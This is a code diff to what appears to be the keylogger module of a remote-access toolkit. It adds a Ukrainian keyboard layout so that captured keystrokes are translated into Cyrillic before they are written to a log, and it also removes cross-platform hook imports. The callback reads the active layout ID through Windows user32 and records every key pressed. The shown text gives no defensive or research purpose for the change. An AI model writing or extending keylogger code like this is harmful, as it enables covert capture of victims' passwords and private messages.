@@ -13,15 +13,8 @@ import util
 import config
 import keyboard
 import ctypes
+import keyboard
 
-
-
-# packages
-if sys.platform == 'win32':
-    import pyHook as hook_manager
-    import pythoncom
-else:
-    import pyxhook as hook_manager
 
 abort = False
 window = None
@@ -121,6 +114,7 @@ upload files via attach
 
 eng_layout="""QWERTYUIOP{}ASDFGHJKL:"ZXCVBNM<>qwertyuiop[]asdfghjkl;'zxcvbnm,."""
 rus_layout="""ЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮйцукенгшщзхъфывапролджэячсмитьбю"""
+ukr_layout="""ЙЦУКЕНГШЩЗХЇФІВАПРОЛДЖЄЯЧСМИТЬБЮйцукенгшщзхїфівапролджєячсмитьбю"""
 
 def callback(event=None):
      if not event:
@@ -131,7 +125,6 @@ def callback(event=None):
      klid = user32.GetKeyboardLayout(thread_id)
      lid = klid & (2**16 - 1)
      lid_hex = hex(lid)
-
      name = event.name
      if len(name) > 1:
         if name == "space":
@@ -148,6 +141,11 @@ def callback(event=None):
             pos = eng_layout.find(name)
             if pos!=-1 and pos < len(rus_layout):
                 name = rus_layout[pos]
+        if lid_hex=="0x422":
+            pos = eng_layout.find(name)
+            if pos!=-1 and pos < len(ukr_layout):
+                name = ukr_layout[pos]
+
 
      logs.write(name)
 
